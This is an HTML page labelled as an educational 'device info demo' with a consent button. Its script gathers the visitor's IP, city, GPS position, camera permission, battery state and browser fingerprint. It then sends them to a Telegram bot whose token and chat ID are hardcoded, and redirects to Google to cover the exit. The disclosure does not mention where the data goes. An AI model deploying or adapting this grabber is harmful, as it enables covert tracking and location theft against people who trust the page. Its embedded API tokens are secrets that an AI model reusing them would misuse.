<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Info Demo</title>
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>
    It demonstrates how websites can collect device information ethically and with user consent.
    No data will be collected until you click "I Agree".
  </p>
  <button id="agreeBtn">I Agree</button>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    async function getDeviceInfo() {
      let data = {
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        battery: "Unknown",
        charging: "Unknown",
        location: "Denied",
        camera: "Not Attempted",
        browser: "",
        language: "",
        platform: "",
        cookies: "",
        touch: "",
        screen: "",
        timezone: "",
        memory: "",
        cpu: ""
      };

      // IP info
      try {
        const ipRes = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await ipRes.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch (e) {
        console.error("IP info error:", e);
      }

      // Battery
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch (e) {
        console.error("Battery info error:", e);
      }

      // Geolocation
      try {
        const position = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej);
        });
        data.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
      } catch (e) {
        data.location = "Denied or Unavailable";
      }

      // Camera access
      try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        data.camera = "Access Granted";
      } catch (e) {
        data.camera = "Access Denied";
      }

      // Browser/device info
      try {
        data.browser = navigator.userAgent;
        data.language = navigator.language;
        data.platform = navigator.platform;
        data.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
        data.touch = 'ontouchstart' in window ? "Yes" : "No";
        data.screen = `${screen.width}x${screen.height}, ${screen.colorDepth}bit`;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
        data.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable";
      } catch (e) {
        console.error("Browser info error:", e);
      }

      return data;
    }

    function sendToTelegram(data) {
      const message = `
ðŸ” *User Device Info*
ðŸŒ IP: ${data.ip}
ðŸ“ Location: ${data.city}, ${data.region}, ${data.country}
ðŸ“¡ GPS: ${data.location}
ðŸ“· Camera: ${data.camera}

ðŸ–¥ *Device Specs*
ðŸ’» Platform: ${data.platform}
ðŸ“± Touch Support: ${data.touch}
ðŸ§  CPU Cores: ${data.cpu}
ðŸ’¾ RAM: ${data.memory}
ðŸ–¼ Screen: ${data.screen}
ðŸŒ Language: ${data.language}
ðŸŒ Browser: ${data.browser}
ðŸª Cookies: ${data.cookies}
ðŸ•’ Timezone: ${data.timezone}

ðŸ”‹ Battery: ${data.battery} | Charging: ${data.charging}
      `;

      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    document.getElementById("agreeBtn").addEventListener("click", async () => {
      const info = await getDeviceInfo();
      sendToTelegram(info);
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 3000);
    });
  </script>
</body>
</html>
